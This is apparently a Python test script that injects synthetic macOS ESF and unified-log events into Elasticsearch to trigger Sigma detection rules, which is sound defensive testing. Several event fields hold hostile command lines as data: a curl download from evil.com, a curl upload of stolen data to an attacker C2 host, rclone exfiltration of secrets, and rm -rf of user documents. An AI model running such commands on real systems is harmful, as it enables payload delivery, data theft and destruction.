#!/usr/bin/env python3
"""
Generate synthetic ESF and UL test events that trigger Sigma rules.
Sends events directly to Elasticsearch to simulate collector output.
"""
import requests
from datetime import datetime, timezone
import uuid
import random
import os

ES_URL = os.getenv("ES_URL", "http://localhost:9200")
ES_AUTH = ("elastic", "changeme")

def get_timestamp():
    return datetime.now(timezone.utc).isoformat()

def send_event(index, event):
    """Send an event to Elasticsearch."""
    resp = requests.post(
        f"{ES_URL}/{index}/_doc",
        auth=ES_AUTH,
        headers={"Content-Type": "application/json"},
        json=event
    )
    return resp.status_code in [200, 201]

def generate_esf_events():
    """Generate ESF events that trigger various rules."""
    today = datetime.now().strftime("%Y.%m.%d")
    index = f"macos-telemetry-esf-{today}"
    
    events = []
    
    # 1. Suspicious curl download (macos_esf_suspicious_curl_download.yml)
    events.append({
        "@timestamp": get_timestamp(),
        "event.kind": "event",
        "event.module": "macos",
        "event.dataset": "macos.esf",
        "event.action": "exec",
        "esf.event_type": 9,
        "esf.event_name": "exec",
        "process.executable": "/usr/bin/curl",
        "process.name": "curl",
        "process.command_line": "curl -o /tmp/malware.sh https://evil.com/payload.sh",
        "process.pid": random.randint(10000, 50000),
        "process.entity_id": str(uuid.uuid4())[:16],
        "process.parent.pid": 1,
        "process.parent.executable": "/sbin/launchd",
        "process.user.name": "root",
        "process.user.id": "0",
        "host.name": "test-mac",
        "_rule_trigger": "macos_esf_suspicious_curl_download"
    })
    
    # 2. Launch persistence creation (macos_esf_launch_persistence_creation.yml)
    events.append({
        "@timestamp": get_timestamp(),
        "event.kind": "event",
        "event.module": "macos",
        "event.dataset": "macos.esf",
        "event.action": "create",
        "esf.event_type": 3,
        "esf.event_name": "create",
        "file.path": "/Library/LaunchDaemons/com.malware.persist.plist",
        "file.name": "com.malware.persist.plist",
        "process.executable": "/bin/bash",
        "process.name": "bash",
        "process.pid": random.randint(10000, 50000),
        "process.user.name": "root",
        "host.name": "test-mac",
        "_rule_trigger": "macos_esf_launch_persistence_creation"
    })
    
    # 3. Hidden file creation (macos_esf_rename_to_hidden_dotfile.yml)
    events.append({
        "@timestamp": get_timestamp(),
        "event.kind": "event",
        "event.module": "macos",
        "event.dataset": "macos.esf",
        "event.action": "rename",
        "esf.event_type": 5,
        "esf.event_name": "rename",
        "file.path": "/Users/admin/.hidden_malware",
        "file.source.path": "/tmp/malware",
        "file.target.path": "/Users/admin/.hidden_malware",
        "process.executable": "/bin/mv",
        "process.name": "mv",
        "process.pid": random.randint(10000, 50000),
        "process.user.name": "admin",
        "host.name": "test-mac",
        "_rule_trigger": "macos_esf_rename_to_hidden_dotfile"
    })
    
    # 4. Sensitive file access (macos_esf_sensitive_file_access.yml)
    events.append({
        "@timestamp": get_timestamp(),
        "event.kind": "event",
        "event.module": "macos",
        "event.dataset": "macos.esf",
        "event.action": "open",
        "esf.event_type": 1,
        "esf.event_name": "open",
        "file.path": "/var/db/dslocal/nodes/Default/users/admin.plist",
        "process.executable": "/usr/bin/python3",
        "process.name": "python3",
        "process.command_line": "python3 -c 'open(\"/var/db/dslocal/nodes/Default/users/admin.plist\").read()'",
        "process.pid": random.randint(10000, 50000),
        "process.user.name": "attacker",
        "host.name": "test-mac",
        "_rule_trigger": "macos_esf_sensitive_file_access"
    })
    
    # 5. Kernel extension from temp (kernel_extension_loaded_from_temporary_directory.yml)
    events.append({
        "@timestamp": get_timestamp(),
        "event.kind": "event",
        "event.module": "macos",
        "event.dataset": "macos.esf",
        "event.action": "kextload",
        "esf.event_type": 43,
        "esf.event_name": "kextload",
        "driver.name": "com.evil.rootkit",
        "file.path": "/tmp/evil.kext",
        "process.executable": "/usr/bin/kextload",
        "process.name": "kextload",
        "process.pid": random.randint(10000, 50000),
        "process.user.name": "root",
        "host.name": "test-mac",
        "_rule_trigger": "kernel_extension_loaded_from_temporary_directory"
    })
    
    # 6. Data compression (macos_data_compression_tools.yml)
    events.append({
        "@timestamp": get_timestamp(),
        "event.kind": "event",
        "event.module": "macos",
        "event.dataset": "macos.esf",
        "event.action": "exec",
        "esf.event_type": 9,
        "esf.event_name": "exec",
        "process.executable": "/usr/bin/zip",
        "process.name": "zip",
        "process.command_line": "zip -r /tmp/exfil.zip /Users/admin/Documents",
        "process.pid": random.randint(10000, 50000),
        "process.user.name": "attacker",
        "host.name": "test-mac",
        "_rule_trigger": "macos_data_compression_tools"
    })
    
    # 7. Network upload activity
    events.append({
        "@timestamp": get_timestamp(),
        "event.kind": "event",
        "event.module": "macos",
        "event.dataset": "macos.esf",
        "event.action": "exec",
        "esf.event_type": 9,
        "esf.event_name": "exec",
        "process.executable": "/usr/bin/curl",
        "process.name": "curl",
        "process.command_line": "curl --upload-file /tmp/stolen_data.zip https://c2.attacker.com/upload",
        "process.pid": random.randint(10000, 50000),
        "process.user.name": "admin",
        "host.name": "test-mac",
        "_rule_trigger": "network_upload_activity"
    })
    
    # 8. DNS query tools (macos_dns_query_tools_for_c2.yml)
    events.append({
        "@timestamp": get_timestamp(),
        "event.kind": "event",
        "event.module": "macos",
        "event.dataset": "macos.esf",
        "event.action": "exec",
        "esf.event_type": 9,
        "esf.event_name": "exec",
        "process.executable": "/usr/bin/dig",
        "process.name": "dig",
        "process.command_line": "dig +short c2.evil.com TXT",
        "process.pid": random.randint(10000, 50000),
        "process.user.name": "admin",
        "host.name": "test-mac",
        "_rule_trigger": "macos_dns_query_tools_for_c2"
    })
    
    # 9. XPC service abuse
    events.append({
        "@timestamp": get_timestamp(),
        "event.kind": "event",
        "event.module": "macos",
        "event.dataset": "macos.esf",
        "event.action": "xpc_connect",
        "esf.event_type": 52,
        "esf.event_name": "xpc_connect",
        "xpc.service_name": "com.apple.security.authtrampoline",
        "process.executable": "/tmp/malware",
        "process.name": "malware",
        "process.pid": random.randint(10000, 50000),
        "process.user.name": "admin",
        "host.name": "test-mac",
        "_rule_trigger": "connection_to_suspicious_xpc_service"
    })
    
    # 10. Privilege escalation via setuid
    events.append({
        "@timestamp": get_timestamp(),
        "event.kind": "event",
        "event.module": "macos",
        "event.dataset": "macos.esf",
        "event.action": "setuid",
        "esf.event_type": 15,
        "esf.event_name": "setuid",
        "process.executable": "/tmp/privesc",
        "process.name": "privesc",
        "process.pid": random.randint(10000, 50000),
        "process.user.id": "0",
        "process.user.name": "root",
        "process.real_user.id": "501",
        "process.real_user.name": "admin",
        "host.name": "test-mac",
        "_rule_trigger": "privilege_escalation_setuid"
    })
    
    # 11. Memory protection change (macos_esf_suspicious_w_x_memory_mapping.yml)
    events.append({
        "@timestamp": get_timestamp(),
        "event.kind": "event",
        "event.module": "macos",
        "event.dataset": "macos.esf",
        "event.action": "mprotect",
        "esf.event_type": 35,
        "esf.event_name": "mprotect",
        "memory.protection": "rwx",
        "process.executable": "/tmp/shellcode_loader",
        "process.name": "shellcode_loader",
        "process.pid": random.randint(10000, 50000),
        "process.user.name": "admin",
        "host.name": "test-mac",
        "_rule_trigger": "macos_esf_suspicious_w_x_memory_mapping"
    })
    
    # 12. SSH connection
    events.append({
        "@timestamp": get_timestamp(),
        "event.kind": "event",
        "event.module": "macos",
        "event.dataset": "macos.esf",
        "event.action": "exec",
        "esf.event_type": 9,
        "esf.event_name": "exec",
        "process.executable": "/usr/bin/ssh",
        "process.name": "ssh",
        "process.command_line": "ssh admin@192.168.1.100",
        "process.pid": random.randint(10000, 50000),
        "process.user.name": "admin",
        "destination.ip": "192.168.1.100",
        "destination.port": 22,
        "host.name": "test-mac",
        "_rule_trigger": "macos_ssh_connection"
    })
    
    # 13. Cloud storage access
    events.append({
        "@timestamp": get_timestamp(),
        "event.kind": "event",
        "event.module": "macos",
        "event.dataset": "macos.esf",
        "event.action": "exec",
        "esf.event_type": 9,
        "esf.event_name": "exec",
        "process.executable": "/usr/local/bin/rclone",
        "process.name": "rclone",
        "process.command_line": "rclone copy /Users/admin/secrets remote:exfil",
        "process.pid": random.randint(10000, 50000),
        "process.user.name": "attacker",
        "host.name": "test-mac",
        "_rule_trigger": "macos_cloud_storage_access_tools"
    })
    
    # 14. Configuration profile installation
    events.append({
        "@timestamp": get_timestamp(),
        "event.kind": "event",
        "event.module": "macos",
        "event.dataset": "macos.esf",
        "event.action": "exec",
        "esf.event_type": 9,
        "esf.event_name": "exec",
        "process.executable": "/usr/bin/profiles",
        "process.name": "profiles",
        "process.command_line": "profiles install -path /tmp/malicious.mobileconfig",
        "process.pid": random.randint(10000, 50000),
        "process.user.name": "root",
        "host.name": "test-mac",
        "_rule_trigger": "macos_configuration_profile_installation"
    })
    
    # 15. Data destruction
    events.append({
        "@timestamp": get_timestamp(),
        "event.kind": "event",
        "event.module": "macos",
        "event.dataset": "macos.esf",
        "event.action": "exec",
        "esf.event_type": 9,
        "esf.event_name": "exec",
        "process.executable": "/bin/rm",
        "process.name": "rm",
        "process.command_line": "rm -rf /Users/admin/Documents/*",
        "process.pid": random.randint(10000, 50000),
        "process.user.name": "attacker",
        "host.name": "test-mac",
        "_rule_trigger": "macos_data_destruction_tools"
    })
    
    return index, events

def generate_ul_events():
    """Generate UL events that trigger various rules."""
    today = datetime.now().strftime("%Y.%m.%d")
    index = f"macos-telemetry-ul-{today}"
    
    events = []
    
    # 1. TCC bypass attempt (tcc_bypass_attempt.yml)
    events.append({
        "@timestamp": get_timestamp(),
        "event.kind": "event",
        "event.module": "macos",
        "event.dataset": "macos.ul",
        "log.logger": "com.apple.TCC",
        "ul.subsystem": "com.apple.TCC",
        "ul.category": "access",
        "message": "TCCDService: Request denied for com.suspicious.app to access kTCCServiceAccessibility",
        "process.executable": "/Applications/Suspicious.app/Contents/MacOS/Suspicious",
        "process.name": "Suspicious",
        "process.pid": random.randint(10000, 50000),
        "user.name": "admin",
        "host.name": "test-mac",
        "_rule_trigger": "tcc_bypass_attempt"
    })
    
    # 2. Sudo execution (sudo_execution.yml)
    events.append({
        "@timestamp": get_timestamp(),
        "event.kind": "event",
        "event.module": "macos",
        "event.dataset": "macos.ul",
        "log.logger": "com.apple.sudo",
        "ul.subsystem": "com.apple.sudo",
        "ul.category": "default",
        "message": "admin : TTY=ttys000 ; PWD=/Users/admin ; USER=root ; COMMAND=/bin/bash",
        "process.executable": "/usr/bin/sudo",
        "process.name": "sudo",
        "process.pid": random.randint(10000, 50000),
        "user.name": "admin",
        "host.name": "test-mac",
        "_rule_trigger": "sudo_execution"
    })
    
    # 3. Failed sudo attempts (sudo_failed_attempts.yml)
    for i in range(5):
        events.append({
            "@timestamp": get_timestamp(),
            "event.kind": "event",
            "event.module": "macos",
            "event.dataset": "macos.ul",
            "log.logger": "com.apple.sudo",
            "ul.subsystem": "com.apple.sudo",
            "ul.category": "default",
            "message": f"attacker : 3 incorrect password attempts ; TTY=ttys00{i} ; PWD=/tmp ; USER=root",
            "process.executable": "/usr/bin/sudo",
            "process.name": "sudo",
            "process.pid": random.randint(10000, 50000),
            "user.name": "attacker",
            "host.name": "test-mac",
            "_rule_trigger": "sudo_failed_attempts"
        })
    
    # 4. Gatekeeper block (macos_uls_gatekeeper_block_spctl.yml)
    events.append({
        "@timestamp": get_timestamp(),
        "event.kind": "event",
        "event.module": "macos",
        "event.dataset": "macos.ul",
        "log.logger": "com.apple.gatekeeper",
        "ul.subsystem": "com.apple.gatekeeper",
        "ul.category": "default",
        "message": "GK: App blocked - /Applications/Malware.app - not signed with valid certificate",
        "process.executable": "/usr/sbin/spctl",
        "process.name": "spctl",
        "process.pid": random.randint(10000, 50000),
        "user.name": "admin",
        "host.name": "test-mac",
        "_rule_trigger": "macos_uls_gatekeeper_block_spctl"
    })
    
    # 5. Code signature failure (macos_uls_securityd_codesignature_failure.yml)
    events.append({
        "@timestamp": get_timestamp(),
        "event.kind": "event",
        "event.module": "macos",
        "event.dataset": "macos.ul",
        "log.logger": "com.apple.securityd",
        "ul.subsystem": "com.apple.securityd",
        "ul.category": "default",
        "message": "SecStaticCode: code signature invalid for /tmp/unsigned_binary",
        "process.executable": "/usr/libexec/securityd",
        "process.name": "securityd",
        "process.pid": random.randint(10000, 50000),
        "user.name": "root",
        "host.name": "test-mac",
        "_rule_trigger": "macos_uls_securityd_codesignature_failure"
    })
    
    # 6. XProtect detection (macos_uls_quarantine_or_xprotect_detection.yml)
    events.append({
        "@timestamp": get_timestamp(),
        "event.kind": "event",
        "event.module": "macos",
        "event.dataset": "macos.ul",
        "log.logger": "com.apple.xprotect",
        "ul.subsystem": "com.apple.xprotect",
        "ul.category": "default",
        "message": "XProtect: Malware detected - OSX.Trojan.Generic in /Users/admin/Downloads/free_software.dmg",
        "process.executable": "/usr/libexec/XProtect",
        "process.name": "XProtect",
        "process.pid": random.randint(10000, 50000),
        "user.name": "admin",
        "host.name": "test-mac",
        "_rule_trigger": "macos_uls_quarantine_or_xprotect_detection"
    })
    
    # 7. TCC access denied (macos_uls_tcc_access_denied.yml)
    events.append({
        "@timestamp": get_timestamp(),
        "event.kind": "event",
        "event.module": "macos",
        "event.dataset": "macos.ul",
        "log.logger": "com.apple.TCC",
        "ul.subsystem": "com.apple.TCC",
        "ul.category": "access",
        "message": "TCCAccessRequest: Denied for com.unknown.app accessing AddressBook",
        "process.executable": "/Applications/Unknown.app/Contents/MacOS/Unknown",
        "process.name": "Unknown",
        "process.pid": random.randint(10000, 50000),
        "user.name": "admin",
        "host.name": "test-mac",
        "_rule_trigger": "macos_uls_tcc_access_denied"
    })
    
    # 8. Keychain access suspicious (keychain_access_suspicious.yml)
    events.append({
        "@timestamp": get_timestamp(),
        "event.kind": "event",
        "event.module": "macos",
        "event.dataset": "macos.ul",
        "log.logger": "com.apple.securityd",
        "ul.subsystem": "com.apple.securityd",
        "ul.category": "default",
        "message": "SecItemCopyMatching: Unauthorized access attempt to keychain item by /tmp/keychain_stealer",
        "process.executable": "/tmp/keychain_stealer",
        "process.name": "keychain_stealer",
        "process.pid": random.randint(10000, 50000),
        "user.name": "admin",
        "host.name": "test-mac",
        "_rule_trigger": "keychain_access_suspicious"
    })
    
    # 9. MDM profile manipulation (mdm_profile_manipulation.yml)
    events.append({
        "@timestamp": get_timestamp(),
        "event.kind": "event",
        "event.module": "macos",
        "event.dataset": "macos.ul",
        "log.logger": "com.apple.ManagedClient",
        "ul.subsystem": "com.apple.ManagedClient",
        "ul.category": "default",
        "message": "MDMClient: Profile removed - com.company.security.profile by unauthorized request",
        "process.executable": "/usr/libexec/mdmclient",
        "process.name": "mdmclient",
        "process.pid": random.randint(10000, 50000),
        "user.name": "admin",
        "host.name": "test-mac",
        "_rule_trigger": "mdm_profile_manipulation"
    })
    
    # 10. LaunchDaemon persistence (persistence_launchd.yml)
    events.append({
        "@timestamp": get_timestamp(),
        "event.kind": "event",
        "event.module": "macos",
        "event.dataset": "macos.ul",
        "log.logger": "com.apple.launchd",
        "ul.subsystem": "com.apple.launchd",
        "ul.category": "default",
        "message": "launchd: Loading job com.malware.backdoor from /Library/LaunchDaemons/com.malware.backdoor.plist",
        "process.executable": "/sbin/launchd",
        "process.name": "launchd",
        "process.pid": 1,
        "user.name": "root",
        "host.name": "test-mac",
        "_rule_trigger": "persistence_launchd"
    })
    
    # 11. SIP modification attempt (sip_modification_attempt.yml)
    events.append({
        "@timestamp": get_timestamp(),
        "event.kind": "event",
        "event.module": "macos",
        "event.dataset": "macos.ul",
        "log.logger": "com.apple.xpc.launchd",
        "ul.subsystem": "com.apple.xpc.launchd",
        "ul.category": "default",
        "message": "csrutil: Attempted to disable System Integrity Protection",
        "process.executable": "/usr/bin/csrutil",
        "process.name": "csrutil",
        "process.pid": random.randint(10000, 50000),
        "user.name": "admin",
        "host.name": "test-mac",
        "_rule_trigger": "sip_modification_attempt"
    })
    
    # 12. XPC service abuse (xpc_service_abuse.yml)
    events.append({
        "@timestamp": get_timestamp(),
        "event.kind": "event",
        "event.module": "macos",
        "event.dataset": "macos.ul",
        "log.logger": "com.apple.xpc",
        "ul.subsystem": "com.apple.xpc",
        "ul.category": "default",
        "message": "XPC: Unexpected connection to privileged service com.apple.rootless.install from /tmp/exploit",
        "process.executable": "/tmp/exploit",
        "process.name": "exploit",
        "process.pid": random.randint(10000, 50000),
        "user.name": "admin",
        "host.name": "test-mac",
        "_rule_trigger": "xpc_service_abuse"
    })
    
    # 13. Authentication events
    events.append({
        "@timestamp": get_timestamp(),
        "event.kind": "event",
        "event.module": "macos",
        "event.dataset": "macos.ul",
        "log.logger": "com.apple.authd",
        "ul.subsystem": "com.apple.authd",
        "ul.category": "default",
        "message": "authd: Authentication failed for user 'admin' - invalid credentials",
        "process.executable": "/usr/libexec/authd",
        "process.name": "authd",
        "process.pid": random.randint(10000, 50000),
        "user.name": "admin",
        "host.name": "test-mac",
        "_rule_trigger": "macos_authentication_events"
    })
    
    # 14. Firewall disabled
    events.append({
        "@timestamp": get_timestamp(),
        "event.kind": "event",
        "event.module": "macos",
        "event.dataset": "macos.ul",
        "log.logger": "com.apple.alf",
        "ul.subsystem": "com.apple.alf",
        "ul.category": "default",
        "message": "ALF: Firewall has been disabled by user",
        "process.executable": "/usr/libexec/ApplicationFirewall/socketfilterfw",
        "process.name": "socketfilterfw",
        "process.pid": random.randint(10000, 50000),
        "user.name": "admin",
        "host.name": "test-mac",
        "_rule_trigger": "firewall_disabled"
    })
    
    return index, events

def main():
    print("=" * 70)
    print("Generating Test Events to Trigger Sigma Rules")
    print("=" * 70)
    
    # Check Elasticsearch
    try:
        resp = requests.get(f"{ES_URL}/_cluster/health", auth=ES_AUTH)
        if resp.status_code != 200:
            print(f"Error: Cannot connect to Elasticsearch at {ES_URL}")
            return 1
        print("\n✓ Connected to Elasticsearch")
    except Exception as e:
        print(f"Error: {e}")
        return 1
    
    # Generate ESF events
    print("\n" + "-" * 70)
    print("Generating ESF Test Events")
    print("-" * 70)
    
    esf_index, esf_events = generate_esf_events()
    esf_success = 0
    for event in esf_events:
        rule = event.pop("_rule_trigger", "unknown")
        if send_event(esf_index, event):
            print(f"  ✓ {rule}")
            esf_success += 1
        else:
            print(f"  ✗ {rule} (failed)")
    
    print(f"\nESF: {esf_success}/{len(esf_events)} events sent to {esf_index}")
    
    # Generate UL events
    print("\n" + "-" * 70)
    print("Generating UL Test Events")
    print("-" * 70)
    
    ul_index, ul_events = generate_ul_events()
    ul_success = 0
    for event in ul_events:
        rule = event.pop("_rule_trigger", "unknown")
        if send_event(ul_index, event):
            print(f"  ✓ {rule}")
            ul_success += 1
        else:
            print(f"  ✗ {rule} (failed)")
    
    print(f"\nUL: {ul_success}/{len(ul_events)} events sent to {ul_index}")
    
    # Refresh indices
    requests.post(f"{ES_URL}/_refresh", auth=ES_AUTH)
    
    # Summary
    print("\n" + "=" * 70)
    print("Summary")
    print("=" * 70)
    print(f"\n  ESF events: {esf_success}")
    print(f"  UL events:  {ul_success}")
    print(f"  Total:      {esf_success + ul_success}")
    
    print("\n  View in Kibana:")
    print("  • Discover: http://localhost:5601/app/discover")
    print("  • Dashboards: http://localhost:5601/app/dashboards")
    print("  • Rules: http://localhost:5601/app/security/rules")
    
    print("\n  If rules are enabled, check alerts at:")
    print("  • http://localhost:5601/app/security/alerts")
    
    return 0

if __name__ == "__main__":
    exit(main())
